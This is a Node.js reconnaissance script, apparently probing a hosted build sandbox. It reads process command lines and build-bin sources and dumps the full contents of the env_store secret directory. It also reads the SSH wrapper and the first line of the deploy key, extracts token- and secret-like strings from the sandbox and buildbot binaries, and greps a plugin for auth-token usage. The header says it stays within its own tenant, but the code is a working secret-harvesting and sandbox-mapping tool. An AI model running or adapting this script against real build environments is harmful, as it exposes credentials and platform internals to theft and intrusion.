// agentdeep-2 — follow-up: argv config JSON, /opt/build-bin sources, cache+env_store layout,
// extension plugin internals, sshwrapper, sandbox strings. Own tenant, bounded, no scanning.
import fs from 'node:fs';
import cp from 'node:child_process';

const R = { probe: 'agentdeep-2', t: new Date().toISOString() };
const cap = (v, n = 60000) => (typeof v === 'string' && v.length > n ? v.slice(0, n) + '..TRUNC' : v);
const rf = (f, n = 60000) => { try { return cap(fs.readFileSync(f, 'utf8'), n); } catch (e) { return 'ERR ' + String(e).slice(0, 90); } };
const sh = (c, n = 12000) => { try { return cap(cp.execSync(c, { encoding: 'utf8', timeout: 12000 }).toString(), n); } catch (e) { return 'ERR ' + String(e.stderr || e).slice(0, 220); } };
fs.mkdirSync('agentdeep-out', { recursive: true });
const flush = () => { try { fs.writeFileSync('agentdeep-out/agentdeep2.json', JSON.stringify(R, null, 1)); } catch {} };

try {
  // 1. FULL cmdlines of the build orchestration processes
  R.bindir = sh('ls -la /opt/build-bin/ 2>&1');
  const pids = fs.readdirSync('/proc').filter((x) => /^\d+$/.test(x));
  R.cmdlines = {};
  for (const pid of pids) {
    try {
      const cmd = fs.readFileSync(`/proc/${pid}/cmdline`, 'utf8').replace(/\0/g, ' ');
      if (/build-bin|buildbot|netlify-bu|plugins\/child/.test(cmd)) {
        R.cmdlines[pid] = cap(cmd, 150000);
      }
    } catch {}
  }
  flush();

  // 2. read /opt/build-bin text files
  R.buildbin = {};
  try {
    for (const f of fs.readdirSync('/opt/build-bin')) {
      const p = '/opt/build-bin/' + f;
      let st = null; try { st = fs.statSync(p); } catch {}
      if (!st || !st.isFile()) continue;
      const head = Buffer.alloc(4);
      const fd = fs.openSync(p, 'r'); fs.readSync(fd, head, 0, 4, 0); fs.closeSync(fd);
      const isElf = head[0] === 0x7f && head[1] === 0x45;
      R.buildbin[f] = { sz: st.size, elf: isElf };
      if (!isElf && st.size < 300000) R.buildbin[f].text = rf(p, 150000);
    }
  } catch (e) { R.buildbinErr = String(e).slice(0, 90); }
  flush();

  // 3. cache layout (2 levels) + small metadata files
  R.cacheLs = sh('ls -la /opt/build/cache | head -30');
  R.cacheDirs = {};
  try {
    for (const d of fs.readdirSync('/opt/build/cache').slice(0, 25)) {
      const p = '/opt/build/cache/' + d;
      let st = null; try { st = fs.statSync(p); } catch {}
      if (!st) continue;
      if (st.isDirectory()) {
        try { R.cacheDirs[d] = fs.readdirSync(p).slice(0, 40); } catch (e) { R.cacheDirs[d] = 'ERR'; }
      } else {
        R.cacheDirs[d] = { sz: st.size };
        if (/\.(json|txt|toml|ya?ml|idx|manifest)$/.test(d) && st.size < 60000) R.cacheDirs[d + ':content'] = rf(p, 40000);
      }
    }
  } catch (e) { R.cacheErr = String(e).slice(0, 90); }
  flush();

  // 4. env_store — full inventory + contents
  R.envStore = {};
  try {
    for (const f of fs.readdirSync('/opt/build/env_store')) {
      const p = '/opt/build/env_store/' + f;
      let st = null; try { st = fs.statSync(p); } catch {}
      if (st && st.isFile() && st.size < 100000) R.envStore[f] = rf(p, 60000);
      else R.envStore[f] = { sz: st && st.size };
    }
  } catch (e) { R.envStoreErr = String(e).slice(0, 90); }
  flush();

  // 5. sshwrapper + deploykey head (ours — first line only)
  R.sshwrapper = rf('/opt/build/sshwrapper', 2000);
  try { R.deploykeyHead = fs.readFileSync('/opt/build/deploykey', 'utf8').split('\n')[0]; } catch (e) { R.deploykeyHead = 'ERR ' + String(e).slice(0, 60); }
  flush();

  // 6. sandbox binary strings (URLs, paths, hostnames)
  const extractStrings = (path, minLen = 6) => {
    try {
      const buf = fs.readFileSync(path);
      const out = []; let cur = '';
      for (const b of buf) {
        if (b >= 32 && b < 127) { cur += String.fromCharCode(b); }
        else { if (cur.length >= minLen) out.push(cur); cur = ''; }
      }
      if (cur.length >= minLen) out.push(cur);
      return out;
    } catch (e) { return ['ERR ' + String(e).slice(0, 60)]; }
  };
  R.sandboxStrings = extractStrings('/usr/local/bin/sandbox').filter((s) =>
    /https?:|\/opt\/|\/tmp\/|netlify|socket|token|api|internal|nsvcs|\.com|\.net|config|secret|key/i.test(s)).slice(0, 400);
  const bb = '/opt/build-bin/buildbot';
  if (fs.existsSync(bb)) R.buildbotStrings = extractStrings(bb).filter((s) =>
    /https?:|\/opt\/|\/tmp\/|netlify|socket|token|api|internal|nsvcs|\.com|\.net|config|secret|key|cache|env_store|deploykey/i.test(s)).slice(0, 600);
  flush();

  // 7. extension plugin internals (how extension_token is used)
  R.pluginLs = sh('find /opt/build/repo/.netlify -maxdepth 4 -type f 2>/dev/null | head -40');
  R.pluginPkg = rf('/opt/build/repo/.netlify/plugins/node_modules/user-agent-blocker-buildhooks/package.json', 8000);
  R.pluginManifest = rf('/opt/build/repo/.netlify/plugins/node_modules/user-agent-blocker-buildhooks/manifest.yml', 8000);
  R.pluginMainFiles = sh('ls /opt/build/repo/.netlify/plugins/node_modules/user-agent-blocker-buildhooks/ 2>&1');
  // grep for token usage in the plugin code
  R.pluginTokenUsage = sh('grep -rn "extension_token\\|EXTENSION_TOKEN\\|netlify_auth_token\\|Authorization" /opt/build/repo/.netlify/plugins/node_modules/user-agent-blocker-buildhooks/ 2>/dev/null | head -20');
  flush();

  // 8. system-log via sudo-less check + any world-readable agent logs
  R.logfiles = sh('find /opt/build /opt/buildhome -maxdepth 3 -name "*.log" -o -name "*log*" -type f 2>/dev/null | head -20');
  flush();
} catch (e) { R.fatal = String((e && e.stack) || e).slice(0, 800); }
R.done = new Date().toISOString();
flush();
console.log('agentdeep-2 done; sections=' + Object.keys(R).length);
